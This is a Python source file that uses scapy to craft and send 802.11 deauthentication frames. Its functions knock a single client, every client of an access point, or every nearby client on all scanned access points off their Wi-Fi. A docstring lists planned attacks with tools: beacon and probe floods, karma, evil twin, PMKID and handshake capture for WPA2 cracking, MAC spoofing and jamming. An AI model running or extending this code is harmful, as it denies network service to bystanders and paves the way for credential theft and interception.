from scapy.all import *
import time
import subprocess
from .AP_scans import *

iface = "wlan1mon"

"""
Ideas for future

✅ 3. Beacon Flood
Flood the air with fake SSIDs to:

Confuse users

Crash poorly designed clients

Tool: mdk3, mdk4, wifijammer, or scapy

✅ 4. Probe Request Flood
Mimic clients scanning for preferred networks

Floods network space with probe requests

Confuses or jams access points

Tool: mdk4, scapy

✅ 5. Karma Attack
Respond to all probe requests with fake AP

Makes devices auto-connect

Used in MITM + credential capture

Tools: hostapd-karma, WiFi-Pumpkin, roguehostapd

✅ 6. SSID Cloning (SSID Confusion)
Create a rogue AP with the same SSID

Clients may switch to the fake one (if signal stronger)

Useful for phishing/captive portal

✅ 7. Disassociation Attack
Like deauth but uses Disassociation frames

May bypass some protections

✅ 8. PMKID Capture Attack
Capture a PMKID (Pre-shared Master Key ID) from WPA2 APs without clients connected

Easier than full handshake in some cases

Tool: hcxdumptool, hcxpcaptool, hashcat

✅ 9. Handshake Capture (for WPA2 cracking)
Capture 4-way WPA2 handshake

Tool: airodump-ng + aireplay-ng (deauth to force reconnection)

Crack with: hashcat, aircrack-ng

✅ 10. AP Channel Hopping / Jamming
Constantly hop channels and send garbage

Disrupts APs operating on those channels

Tool: mdk4, custom scapy scripts

✅ 11. MAC Spoofing / Impersonation
Change MAC address to impersonate:

An AP (e.g., Evil Twin)

A client (bypass filters)

Tool: macchanger, ifconfig, ip link

✅ 12. WiFi Jammer
Send constant invalid or malformed packets to jam a band

Dangerous, causes denial of service
"""

def start_wifi_adapter():
    subprocess.run(["bash", "./network/wifi_adapter_start.sh"], check = True)

def stop_wifi_adapter():
    subprocess.run(["bash", "./network/wifi_adapter_stop.sh"], check = True)

def deauth_host(host_mac, bssid):
    # crafting deauth frame
    pkt = RadioTap()/Dot11(
        addr1 = host_mac,   # MAC of host getting deauthed
        addr2 = bssid,      # MAC of AP (BSSID in most cases)
        addr3 = bssid       # BSSID
    )/Dot11Deauth(reason = 7) 

    start_wifi_adapter()

    sendp(pkt, iface = iface, count = 100, inter = 0.1)

    stop_wifi_adapter()

def deauth_AP(bssid):
    # scanning for nearby hosts
    hosts_macs = get_hosts_mac()

    # building frame for each host and sending it multiple times
    for host in hosts_macs:
        pkt = RadioTap()/Dot11(
            addr1 = host,   # MAC of host getting deauthed
            addr2 = bssid,      # MAC of AP (BSSID in most cases)
            addr3 = bssid       # BSSID
        )/Dot11Deauth(reason = 7) 

        start_wifi_adapter()

        sendp(pkt, iface = iface, count = 50, inter = 0.1)

        stop_wifi_adapter()

def deauth_all():
    # scanning for nearby hosts
    hosts_macs = get_hosts_mac()
    infos = get_AP_mac()
    bssids = []

    for info in infos:
        bssids.append(info[1])

    start_wifi_adapter()

    # building frame for each host and sending it multiple times
    for bssid in bssids:
        for host in hosts_macs:
            pkt = RadioTap()/Dot11(
                addr1 = host,   # MAC of host getting deauthed
                addr2 = bssid,      # MAC of AP (BSSID in most cases)
                addr3 = bssid       # BSSID
            )/Dot11Deauth(reason = 7) 

            sendp(pkt, iface = iface, count = 50, inter = 0.1)

    stop_wifi_adapter()